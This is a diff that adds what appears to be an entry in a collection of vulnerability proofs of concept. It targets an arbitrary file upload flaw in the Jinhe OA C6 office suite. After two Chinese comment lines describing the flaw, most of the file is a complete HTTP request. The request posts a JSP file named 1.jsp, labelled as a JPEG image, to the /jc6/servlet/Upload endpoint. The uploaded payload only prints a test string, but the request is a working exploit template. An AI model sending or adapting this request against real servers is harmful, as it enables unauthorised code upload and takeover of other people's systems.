@@ -1,0 +1,16 @@
+# 金和OA jc6 Upload 任意文件上传漏洞
+# 金和OA是一款企业级办公自动化软件,旨在提供高效的办公流程管理和协作解决方案。金和OA-C6存在任意文件写入漏洞，攻击者可利用该漏洞获取服务器控制权。
+POST /jc6/servlet/Upload?officeSaveFlag=0&dbimg=false&path=&setpath=/upload/&acid=80051413&bid=hd_tag_m8mv23qe HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23qe
+RM-PRO-Token: f2355e9c2e2ba9026cd4834375bff344
+RM-PRO-Time: 1742808336964
+User-Agent: curl/7.83.1
+Content-Type: multipart/form-data; boundary=ee055230808ca4602e92d0b7c4ecc63d
+
+--ee055230808ca4602e92d0b7c4ecc63d
+Content-Disposition: form-data; name="img"; filename="1.jsp"
+Content-Type: image/jpeg
+
+<% out.println("tteesstt1"); %>
+--ee055230808ca4602e92d0b7c4ecc63d--
